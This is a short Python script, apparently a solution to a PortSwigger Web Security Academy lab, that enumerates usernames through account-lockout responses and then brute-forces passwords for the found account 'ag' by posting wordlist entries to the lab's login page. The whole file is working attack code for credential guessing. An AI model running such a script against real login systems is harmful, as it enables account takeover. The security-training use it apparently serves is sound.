#Username enumeration via account lock
#How to bypass when you enter invalid credentials for your a/c and a/c gets locked after sometimes
#Solution: First need to find which username exist so that it might gets locked then we bruteforce that existing username

import requests
import random

url = "https://0a4b00b00436a560c054086000f90046.web-security-academy.net/login"
fd = open("/home/tester13/Documents/CTF/Portswigger/Authentication/user.txt","r")
usernames= fd.read()
fd.close()

usernames_list = list(usernames.split('\n'))
"""for i in usernames_list:
    for j in range(1,6):
        data ={
            "username":i,
            "password":"password"
        }
        r = requests.post(url,data=data)
        if "Invalid username" not in r.text:
            print(i)
            break
"""
#After finding the username that might get blocked after mutliple attempts
fd = open("/home/tester13/Documents/CTF/Portswigger/Authentication/pass.txt","r")
passwords = fd.read()
fd.close()
password_list = list(passwords.split('\n'))

counter = 0
for i in password_list:
    data = {
        "username":"ag",
        "password":i
    }
    r = requests.post(url,data=data)
    if "too many incorrect" not in r.text:
        print(i)
        